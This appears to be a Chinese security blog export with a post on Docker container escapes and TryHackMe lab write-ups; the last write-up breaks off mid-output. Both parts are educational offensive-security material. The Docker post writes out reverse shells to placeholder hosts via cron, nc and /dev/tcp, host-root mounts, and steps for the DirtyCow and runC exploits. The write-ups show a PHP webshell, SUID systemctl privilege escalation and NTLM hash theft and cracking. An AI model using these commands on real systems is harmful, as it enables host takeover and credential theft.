利用场景：通过对宿主机端口扫描，发现有2375端口开放，可以执行任意docker命令。我们可以据此，在宿主机上运行一个容器，然后将宿主机的根目录挂载至docker的/mnt目录下，便可以在容器中任意读写宿主机的文件了。我们可以将命令写入crontab配置文件，进行反弹shell。我们先随便拉取一个镜像然后创建容器 1234docker -H tcp://ip pull busybox#这里我们将该宿主机的根目录挂在到容器的/mnt目录下docker -H tcp://ip:2375 run -it -v /:/mnt 容器id sh 执行之后会返回一个该容器宿主机的shell，进入/mnt目录(cd /mnt/)下即可逃逸到宿主机 还可以并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。首先我们随意启动一个容器，然后将宿主机的/etc目录挂载到容器的/tmp/etc目录中 1docker -H tcp://宿主ip:2375 run -it -v /test:/tmp/etc 容器id /bin/bash 然后开启监听（这里的监听端口取决于脚本，下面的脚本中写的是8888端口，那我们就监听这个端口），并且在容器中利用下面的脚本进行反弹 1234import dockerclient = docker.DockerClient(base_url=&#x27;http://your-ip:2375/&#x27;)data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 8888 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;) 然后还可以在容器中写计划任务，反弹宿主机的shell，记得监听1234端口 1echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/宿主机ip/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root Docker 高危启动参数 – privileged 特权模式启动容器特权模式是很有效并且常用的一种逃逸方法当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限 如何判断当前容器是否为特权模式，输入下面的命令，如果返回为000000xfffffffff代表为特权模式起，x为任意数字 1cat /proc/self/status |grep Cap 利用步骤：使用特权模式启动一个容器，容器部分要根据实际进行修改 1sudo docker run -itd --privileged ubuntu:latest /bin/bash 然后进入容器，用fdisk -l查看磁盘文件，查看到宿主机的磁盘为/dev/vda1，如果有很多个的话，那就一般是最大的那个进行挂载，将宿主机的磁盘根目录挂载到docker容器的/home/test目录下 1mount /dev/vda1 /home/test 然后切换目录到 /home/test 就可成功逃逸到宿主机目录 1chroot /home/test 由于内核漏洞引起的逃逸DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得root权限的shell。Docker 与 宿主机共享内核，如果宿主机有脏牛漏洞，那容器就可以利用这个漏洞进行 docker 逃逸。因此容器需要在存在 dirtyCow 漏洞的宿主机里。利用脚本获取：https://github.com/gebl/dirtycow-docker-vdso.git下载脚本 12345git clone https://github.com/scumjr/dirtycow-vdso.gitcd dirtycow-vdso/sudo apt-get updatesudo apt-get install nasmmake 下载完成之后进行利用 12./0xdeadbeef #反弹shell到本地主机./0xdeadbeef ip:port #反弹shell到指定主机的指定端口 因为这个要求宿主机含有脏牛漏洞才可以，所以我们要清楚他的影响范围 影响的 Linux 内核版本主要是2.6.22（发布于2007年）到 4.8（发布于2016年）之间的版本。 可以用下面的命令查看内核版本 1uname -r 常见的受影响的版本有 12345678- RHEL7 Linux x86_64- RHEL4（4.4.7-16）- Debian 7（“wheel”）- Ubuntu 14.04.1 LTS- Ubuntu 14.04.5 LTS- Ubuntu 16.04.1 LTS- Ubuntu 16.10- Linux Mint 17.2 docker程序漏洞导致的docker逃逸runC容器逃逸漏洞 CVE-2019-5736CVE-2019-5736 是一个与Docker容器运行时（containerd和runc）相关的漏洞。漏洞允许攻击者在容器内部执行任意命令，并且具有与容器相同的权限。该漏洞于2019年2月发布，影响runc的所有版本，而runc是Docker容器运行时的一部分。 漏洞的核心问题是containerd在处理容器启动过程中对runc的调用时存在安全漏洞，攻击者可以通过构造恶意的容器镜像来实现在容器内部执行任意命令的攻击。这允许攻击者在容器内部获取宿主系统上与容器相同的权限 影响的主要版本有： 123- Docker CE 18.09以前的版本- Docker EE 18.09以前的版本- RunC version &lt;=1.0-rc6 我们用下面的命令查看一下我们的docker版本和runc版本 12docker --versionrunc --version 生成payload的利用链接为：https://github.com/Frichetten/CVE-2019-5736-PoC 12git clone https://github.com/Frichetten/CVE-2019-5736-PoC 下载成功之后，编辑里面的go文件(main.go)，把监听地址和端口设置成自己的然后编译生成payload（生成main文件），这里需要go环境 1CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 然后把生成的文件上传到 docker 中（使用docker cp命令）然后在我们本地开启监听，之后docker容器执行我们的payload即可 1./main Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss_.so库。黑客可以通过在容器中替换libnss_.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。 影响版本：Docker 19.03.0 这个漏洞的复现和利用可以参考 [这篇文章] (https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html) 危险挂载导致Docker逃逸Docker逃逸中的”危险挂载”通常指的是容器内的文件系统挂载到主机上，而且这个挂载操作没有受到足够的限制，导致了一些安全漏洞。这可能允许攻击者通过容器内部的文件系统进行一系列的恶意活动，包括读取或修改主机上的敏感文件。 挂载目录（-v &#x2F;:&#x2F;soft）将宿主机root目录挂载到容器 1docker run -itd -v /root:/root ubuntu:18.04 /bin/bash 写入ssh密钥进行登录 1mkdir /root/.sshcat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys 挂载Docker Socket（docker.sock）使用者将宿主机/var/run/docker.sock文件挂载到容器中Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：unix:///var/run/docker.sock、tcp://host:port 和 fd://socketfd 这三种通信方式中：Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信——查询信息或下发命令。 判断方法：实战中通过find命令，可查找类似docker.sock等高危目录和文件 1find / -name docker.sock 如果存在的话，相当于在docker里可以执行宿主机docker命令，这样的话，我们新启一个容器，挂载宿主机根目录，即可逃逸 逃逸步骤： 首先创建一个容器并挂载/var/run/docker.sock1docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu 在该容器内安装Docker命令行客户端123456789101112131415apt-update apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common curl -fsSL [https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg](https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg) | apt-key add - apt-key fingerprint 0EBFCD88 add-apt-repository \\ &quot;deb [arch=amd64] [https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/](https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/) \\ $(lsb_release -cs) \\ stable&quot; apt-get update apt-get install docker-ce docker-ce-cli containerd.io 接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部123docker run -it -v /:/host ubuntu:latest /bin/bash#这里的 latest 要根据实际版本修改如：docker run -it -v /:/host ubuntu:18.04 /bin/bash 在新容器内执行chroot将根目录切换到挂载的宿主机根目录。chroot /host 防止docker逃逸的方法 定期更新 Docker 和相关组件： 保持 Docker 引擎、Docker Compose 等工具的最新版本，以获取最新的安全修复和改进。 限制容器权限： 在运行容器时，使用最小化的权限和特权模式。避免在容器内使用 root 权限，通过非 root 用户运行应用程序。 尽量不要将宿主机目录挂载至容器目录 参考文章：渗透测试之docker逃逸Linux内网渗透(一)——容器逃逸docker逃逸的几种方法及其原理","categories":[{"name":"web","slug":"web","permalink":"https://qingwan.top/categories/web/"}],"tags":[],"author":"Qingwan"},{"title":"TryHackMe-vulnversity渗透靶场wp","slug":"THM-Vulnversity","date":"2024-02-26T12:04:02.512Z","updated":"2024-02-26T12:11:06.347Z","comments":true,"path":"2024/02/26/THM-Vulnversity/","link":"","permalink":"https://qingwan.top/2024/02/26/THM-Vulnversity/","excerpt":"TryHackMe-vulnversity渗透靶场wp","text":"TryHackMe-vulnversity渗透靶场wp 靶场链接：https://tryhackme.com/room/vulnversity 用nmap进行勘察使用nmap进行信息收集我们通过 openvpn 进行连接之后，我们就开始进行信息收集 12345678910111213141516$ nmap -sV -Pn 10.10.14.85Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:29 CSTNmap scan report for 10.10.14.85Host is up (0.36s latency).Not shown: 994 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)3128/tcp open http-proxy Squid http proxy 3.5.123333/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 85.34 second 通过我们扫描出来的结果和题目所给出的nmap的用法我们除了问操作系统的那个问题就都解决了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546nmap -A 10.10.14.85Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:33 CSTNmap scan report for 10.10.14.85Host is up (0.39s latency).Not shown: 994 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)| 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)|_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3128/tcp open http-proxy Squid http proxy 3.5.12|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/3.5.123333/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Vuln UniversityService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: vulnuniversity| NetBIOS computer name: VULNUNIVERSITY\\x00| Domain name: \\x00| FQDN: vulnuniversity|_ System time: 2024-02-26T00:35:12-05:00| smb2-time: | date: 2024-02-26T05:35:11|_ start_date: N/A| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 106.08 seconds 可以得出系统为Ubuntu 利用Gobuster进行信息收集这是一个目录文件和DNS爆破工具我们先在kali下下载这个工具 1sudo apt-get install gobuster 然后输入命令进行扫描，这里我们的字典就用kali下自带的字典 1gobuster dir -u http://10.10.14.85:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 访问一下/internal页面发现存在文件上传点，记得是http而不是https 利用文件上传漏洞上传php木马反弹shell这里有apache服务，而一般木马都是php文件所以我们先上传一个php木马试一下，木马名为1.php木马内容为 1&lt;?php @eval($_POST[&#x27;attack&#x27;]); ?&gt; 发现无法上传，猜测后缀被过滤，我们试一下其他的常用的可以被解析的php文件的后缀，用 Burpsuite 爆破一下，上传然后进行抓包，对后缀名进行爆破爆破字典处写入常见的php文件后缀名发现phtml后缀文件成功上传知道什么后缀的木马文件可以上传之后，我们就可以上传一个可以反弹shell的php木马我们修改木马中的两个部分，将ip换成我们自己的，端口修改为我们自己想要的端口，记得木马文件名要保存为 .phtml 后缀 然后开启监听 1nc -lvp 1234 上传木马，上传成功之后，访问一下，一般文件上传的目录都为uploads成功反弹，得到flag 1cat /home/bill/user.txt 8bd7xxxxxxxxxxxxxxxxxxxxedb而管理web网络服务的用户就为home的子目录下的用户，即bill suid 提权12$ cd /root/bin/sh: 19: cd: can&#x27;t cd to root 可以看到现在我们没有访问 root 文件夹的权限所以我们要进行提权 123456789101112131415161718192021222324252627$ whoamiwww-data$ ls -lntotal 88drwxr-xr-x 2 0 0 4096 Jul 31 2019 bindrwxr-xr-x 3 0 0 4096 Jul 31 2019 bootdrwxr-xr-x 17 0 0 3700 Feb 26 00:23 devdrwxr-xr-x 98 0 0 4096 Aug 1 2019 etcdrwxr-xr-x 3 0 0 4096 Jul 31 2019 homelrwxrwxrwx 1 0 0 33 Jul 31 2019 initrd.img -&gt; boot/initrd.img-4.4.0-142-genericdrwxr-xr-x 22 0 0 4096 Jul 31 2019 libdrwxr-xr-x 2 0 0 4096 Jul 31 2019 lib64drwx------ 2 0 0 16384 Jul 31 2019 lost+founddrwxr-xr-x 3 0 0 4096 Jul 31 2019 mediadrwxr-xr-x 2 0 0 4096 Feb 26 2019 mntdrwxr-xr-x 2 0 0 4096 Feb 26 2019 optdr-xr-xr-x 135 0 0 0 Feb 26 00:23 procdrwx------ 4 0 0 4096 Jul 31 2019 rootdrwxr-xr-x 28 0 0 980 Feb 26 00:25 rundrwxr-xr-x 2 0 0 12288 Jul 31 2019 sbindrwxr-xr-x 2 0 0 4096 Jul 31 2019 snapdrwxr-xr-x 3 0 0 4096 Jul 31 2019 srvdr-xr-xr-x 13 0 0 0 Feb 26 00:23 sysdrwxrwxrwt 8 0 0 4096 Feb 26 01:39 tmpdrwxr-xr-x 10 0 0 4096 Jul 31 2019 usrdrwxr-xr-x 14 0 0 4096 Jul 31 2019 varlrwxrwxrwx 1 0 0 30 Jul 31 2019 vmlinuz -&gt; boot/vmlinuz-4.4.0-142-generic 可以看到，我们当前的用户为 www-data，所有用户里面，权限最高的为 root 用户这里有一个知识点，为 suid ，即 set owner userId upon execution，可以简单的理解为 set uid在Linux 中，SUID（执行时设置所有者 userId）是赋予文件的一种特定类型的文件权限。 SUID 向用户授予临时权限，以在文件所有者（而不是运行它的用户）的许可下运行程序&#x2F;文件。例如，用于更改密码的二进制文件设置了 SUID 位 (&#x2F;usr/bin/passwd)。这是因为要更改您的密码；它将需要写入您无权访问的文件，而 root 可以；因此它具有 root 权限来进行正确的更改。比如：那这里我们就要进行 suid 提权来访问 root文件可以使用这下面的任意一个来进行查询，第二个更加详细灵活，第一个更加简约明了 find / -type f -perm /4000 2&gt;/dev/null: 使用find命令进行搜索。 -type f指定只搜索文件。 -perm /4000指定了权限模式，/4000表示匹配任何包含SUID权限的文件。 2&gt;/dev/null将错误输出重定向到空设备，以避免输出不必要的警告信息。 find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;: 同样使用find命令进行搜索。 -user root指定只搜索属于用户”root”的文件。 -perm -4000指定了权限模式，-4000表示匹配具有SUID权限的文件。 -exec ls -ldb &#123;&#125; \\;执行一个外部命令ls -ldb来显示匹配文件的详细信息。12find / -type f -perm /4000 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 看到这里具有root权限的文件中，并没有我们常见的那几个命令123456789101112131415161718192021222324252627$ find / -type f -perm /4000 2&gt;/dev/null/usr/bin/newuidmap/usr/bin/chfn/usr/bin/newgidmap/usr/bin/sudo/usr/bin/chsh/usr/bin/passwd/usr/bin/pkexec/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/at/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/squid/pinger/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/bin/su/bin/ntfs-3g/bin/mount/bin/ping6/bin/umount/bin/systemctl/bin/ping/bin/fusermount/sbin/mount.cifs 但是我们注意到有一个特殊的文件 /bin/systemctl，/bin/systemctl是一个系统管理工具，它用于控制 systemd 系统和服务管理器。systemd 是一种初始化系统和服务管理器。/bin/systemctl命令可以通过启动、停止、重启、查询和管理系统服务。在 systemctl 工具上启用了 setuid 权限，那么任何拥有该工具执行权限的用户都可能以该工具设置的特权身份（比如 root 用户）执行系统管理任务。下一步我们就开始提权，主要的思路就是创建一个临时的 systemd 服务配置文件，链接并启动该服务，并将 root 用户的 flag 写入一个临时文件中。123456789101112131415161718#创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件xxx=$(mktemp).service #将配置内容写入环境变量，服务执行后执行命令，然后通过root权限去输出flag到指定文件。echo &#x27;[Service]ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;[Install]WantedBy=multi-user.target&#x27; &gt; $xxx#链接服务并启动/bin/systemctl link $xxx#启用一个单元实例--服务单元文件得以运行/bin/systemctl enable --now $xxx#获得root flagcat /tmp/outputa58ffxxxxxxxxxxxxxxxxfd5 使用 mktemp 命令生成一个随机命名的临时文件，并将其命名为 xxx.service。这个文件名会被保存在环境变量 xxx 中，以便后续操作使用。由于生成的是一个 systemd 服务配置文件，因此需要以 .service 作为文件扩展名。 使用 echo 命令将服务配置内容写入环境变量 xxx 中。具体来说，这个服务配置文件指定了服务的启动命令为 cat /root/root.txt &gt; /tmp/output，这条命令将根目录下的 root.txt 文件内容输出到 /tmp/output 文件中。服务安装后会启用 multi-user.target 目标单元。 使用 /bin/systemctl link 命令将服务配置文件链接到系统服务管理器中，以便可以通过服务管理器对服务进行管理。 使用 /bin/systemctl enable --now 命令启用服务，使其在系统启动时自动启动，并立即启动服务实例。 使用 cat 命令读取 /tmp/output 文件中的内容，其中存储了 root 用户的 flag。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"TryHackMe-reset渗透靶场wp","slug":"THM-reset靶场wp","date":"2024-02-25T09:17:18.172Z","updated":"2024-02-25T09:49:14.876Z","comments":true,"path":"2024/02/25/THM-reset靶场wp/","link":"","permalink":"https://qingwan.top/2024/02/25/THM-reset%E9%9D%B6%E5%9C%BAwp/","excerpt":"TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题","text":"TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题 实验需要我们获得两个flag，一个是user用户的flag，还有一个是获得root用户的flag为了方便操作，我们先用openvpn连接到我们本地的kali虚拟机上（官方文章）但是连接openvpn用了我蛮久时间，这个对网络的要求蛮高的，有几个点，第一个kali里面也要挂梯子，然后一次不成功记得多试几次，还不行就试试在官网上换个节点再试试。连接成功后，连接页面这里会显示连接成功，并且可以看到给我们分配的虚拟ip为10.17.6.118，这个ip是固定ip 外部打点我们开启靶机，我们的靶机ip为10.10.254.2（后面靶机过期，所以重新打开靶机，ip地址会变化，除了固定分配的ip之外的其他ip都是我们的靶机ip）先用nmap扫描一下端口，这里实战中如果觉得太速度太快了可能被发现的话，可以改一下速度 1nmap -Pn -sC -sV 10.10.254.2 我们看到了开放了一些端口，而且还知道了域名为THM，计算机名字为HAYStack 123456789101112PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-06 09:29:51Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services 我们看到他打开了445端口，有SMB服务，打开了3389端口，可以尝试远程桌面连接。但是我们该怎么打进去呢，这里也没有web服务。我们先从SMB服务入手吧，尝试一下用CrackMapExec进行SMB枚举 匿名用户访问12345678#尝试使用已知的用户名和密码进行身份验证、枚举可访问的共享资源等。crackmapexec smb 10.10.254.2 #添加了 --shares 参数。它的作用是在扫描过程中枚举目标主机上的共享资源。通过列出共享资源crackmapexec smb 10.10.254.2 --shares#指定用户名和密码进行身份验证crackmapexec smb 10.10.254.2 --shares -u QW -p &#x27;&#x27; 我们使用前两个命令，发现并没有显示什么共享资源，而且报错STATUS_USER_SESSION_DELETED，所以我们想到给他一个用户第三个命令中我们指定了用户名为QW，密码为空，用户名为我们自己指定的任意值这个命令就列出了我们的共享资源，但是为什么呢？这里QW这个用户名也是原来的计算机中不存在的呀。这里是由于当开启支持匿名访问的文件共享后，其他用户不需要输入用户名和口令，可以直接访问文件服务器的共享文件。所以这里的原因是由于靶机支持匿名登录。当使用SMB协议输入一个不存在的用户名时，系统会将我们作为匿名用户对待，并授予我们访问共享资源的权限。 我们看到这里的DATA这个共享目录，有读和写的权限，那我们就访问一下这个目录这里由于转义原因，我们需要多加对应个数的斜杠，回车会提示输入密码，随便输入一个即可，一次没成功，多试几次就行 1smbclient -U &#x27;QW&#x27; \\\\\\\\10.10.99.197\\\\Data 然后我们看看他当前目录有哪些文件 1234567891011┌──(kali㉿kali)-[~]└─$ smbclient -U &#x27;QW&#x27; \\\\\\\\10.10.99.197\\\\DataPassword for [WORKGROUP\\QW]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Jul 19 16:40:57 2023 .. D 0 Wed Jul 19 16:40:57 2023 onboarding D 0 Wed Feb 7 15:16:13 2024 7863807 blocks of size 4096. 3001419 blocks available 切换到onboarding看一下 123456789101112131415smb: \\&gt; cd onboardingsmb: \\onboarding\\&gt; ls . D 0 Wed Feb 7 15:17:13 2024 .. D 0 Wed Feb 7 15:17:13 2024 gmx2kujx.wlc.txt A 521 Tue Aug 22 02:21:59 2023 j1kmav5y.ogg.pdf A 3032659 Mon Jul 17 16:12:09 2023 qt014yev.xfy.pdf A 4700896 Mon Jul 17 16:11:53 2023 7863807 blocks of size 4096. 3001284 blocks availablesmb: \\onboarding\\&gt; ls . D 0 Wed Feb 7 15:19:43 2024 .. D 0 Wed Feb 7 15:19:43 2024 htdrjeca.rtp.pdf A 4700896 Mon Jul 17 16:11:53 2023 spmna0aq.2ly.pdf A 3032659 Mon Jul 17 16:12:09 2023 tah3bqah.5si.txt A 521 Tue Aug 22 02:21:59 2023 我们看到两次访问的文件名发生了变化，那证明这个目录下存在活动。我们将这三个文件下载下来查看一下 1234mask &quot;&quot; recurse ON prompt OFF mget * mask &quot;&quot;: 这个命令将掩码设置为空，意味着匹配所有文件名。在批量操作中，掩码用于指定要匹配的文件名模式，如果将掩码设置为空，则表示匹配所有文件。 recurse ON: 这个命令将递归设置为打开状态。当递归设置为打开时，在批量操作中还会包括子目录下的文件。因此，如果有子目录，也会下载其中的文件。 prompt OFF: 这个命令将提示设置为关闭状态。在FTP批处理操作中，通常会询问用户是否要下载每个文件，如果将提示设置为关闭，则在下载过程中不会提示用户，而是自动执行下载操作。 mget *: 这个命令用于批量下载所有文件。根据前面设置的掩码、递归和提示选项，该命令将下载当前目录下的所有文件，包括子目录中的文件，且不会提示用户确认每个文件的下载。 通过以上几个命令，我们把onboarding目录下的文件下载到我们的机器上，我们查看一下txt文件里面的内容。 通过上面信息我们可以知道，我们的初始密码为：ResetMe123! ntlm theft生成hash窃取文件获取hash值上面我们说到这个目录下的文件名在时刻变化，所以我们如果把我们的文件也放在该目录下，那当受害者访问该文件时，我们就可以获取到他的NTLM hash。这里我们要利用到ntlm_theft这个脚本 12#这里的ip为一开始THM给我们分配的ip，并不是靶机的ippython3 ntlm_theft.py -g all -s 10.17.6.118 -f qw 这将在我们当前目录下生成一个qw文件夹，我们进入该qw文件夹，然后进行SMB连接 1smbclient -U &#x27;QW&#x27; \\\\\\\\10.10.0.69\\\\Data 然后上传对应文件，记得要在onboarding目录下上传 1put qw.lnk 再在Responder开启监听 1sudo responder -I tun0 -v 过一会后收到用户的密码以及hash值我们成功得到了NTLNv2 hash，并且还知道了用户名为AUTOMATE 123[SMB] NTLMv2-SSP Client : 10.10.0.69[SMB] NTLMv2-SSP Username : THM\\AUTOMATE[SMB] NTLMv2-SSP Hash : AUTOMATE::THM:173a6d47a02a194d:E92F330550335AE2C9D349F0D66E5CAD:01010000000000000030F5BDEB59DA01FF1BD4164F02936400000000020008 003500440030005A0001001E00570049004E002D0046003400320037004A0034004D004400460 04800460004003400570049004E002D0046003400320037004A0034004D004400460048004600 2E003500440030005A002E004C004F00430041004C00030014003500440030005A002E004C004 F00430041004C00050014003500440030005A002E004C004F00430041004C00070008000030F5 BDEB59DA010600040002000000080030003000000000000000010000000020000074452431AFE 7A9850C284C766D876F15A0EF7CCCCE693088EB5563209FD083D40A0010000000000000000000 00000000000000000900200063006900660073002F00310030002E00310037002E0036002E003 100310038000000000000000000 拿到了hash值，我们先用hashcat或者john爆破一下，保存hash值到hash.txt 1hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force --show 得到密码为Passw0rd1，得到密码之后我们就尝试登录。我们前面看到开启了3389端口，我们分别用kali和win10连接一下，发现都连接不上 应该是当前的账户不能RDP这里看了下网上的wp，用的是evil-winrm这个工具 1evil-winrm -i 10.10.141.138 -u AUTOMATE -p Passw0rd1 拿下shell 然后得到第一个user的flagTHM&#123;AUTOMATION_WILL_REPLACE_US&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051*Evil-WinRM* PS C:\\Users\\automate\\Documents&gt; dir*Evil-WinRM* PS C:\\Users\\automate\\Documents&gt; pwdPath----C:\\Users\\automate\\Documents*Evil-WinRM* PS C:\\Users\\automate\\Documents&gt; hostnameHayStack*Evil-WinRM* PS C:\\Users\\automate\\Documents&gt; dir*Evil-WinRM* PS C:\\Users\\automate\\Documents&gt; cd ../*Evil-WinRM* PS C:\\Users\\automate&gt; dir Directory: C:\\Users\\automateMode LastWriteTime Length Name---- ------------- ------ ----d-r--- 6/14/2023 8:35 AM 3D Objectsd-r--- 6/14/2023 8:35 AM Contactsd-r--- 7/14/2023 7:28 AM Desktopd-r--- 7/13/2023 3:49 PM Documentsd-r--- 6/14/2023 8:35 AM Downloadsd-r--- 6/14/2023 8:35 AM Favoritesd-r--- 6/14/2023 8:35 AM Linksd-r--- 6/14/2023 8:35 AM Musicd-r--- 6/14/2023 8:35 AM Picturesd-r--- 6/14/2023 8:35 AM Saved Gamesd-r--- 6/14/2023 8:35 AM Searchesd-r--- 6/14/2023 8:35 AM Videos*Evil-WinRM* PS C:\\Users\\automate&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; dir Directory: C:\\Users\\automate\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----a---- 6/21/2016 3:36 PM 527 EC2 Feedback.website-a---- 6/21/2016 3:36 PM 554 EC2 Microsoft Windows Guide.website-a---- 6/16/2023 4:35 PM 31 user.txt*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; type user.txtTHM&#123;AUTOMATION_WILL_REPLACE_US&#125;*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; 这里有一个思考，那就是怎么想到用Evil-WinRM这个工具的呢？ WinRM = Windows Remote Management，即Windows远程管理 内网信息收集我们拿下了第一台机器之后，就看一下域内还有哪些其他的机器，下一步我们的目标是拿下域控我们输入systeminfo命令查看，发现我们没有权限执行 12345678910*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; systeminfoProgram &#x27;systeminfo.exe&#x27; failed to run: Access is deniedAt line:1 char:1+ systeminfo+ ~~~~~~~~~~.At line:1 char:1+ systeminfo+ ~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed 查询一下域内用户的信息 1234567891011121314151617181920*Evil-WinRM* PS C:\\Users\\automate\\Desktop&gt; net user /domainUser accounts for \\\\-------------------------------------------------------------------------------3091731410SA 3811465497SA 3966486072SAAdministrator ANDY_BLACKWELL AUGUSTA_HAMILTONAUTOMATE CECILE_WONG CHERYL_MULLINSCHRISTINA_MCCORMICK CRUZ_HALL 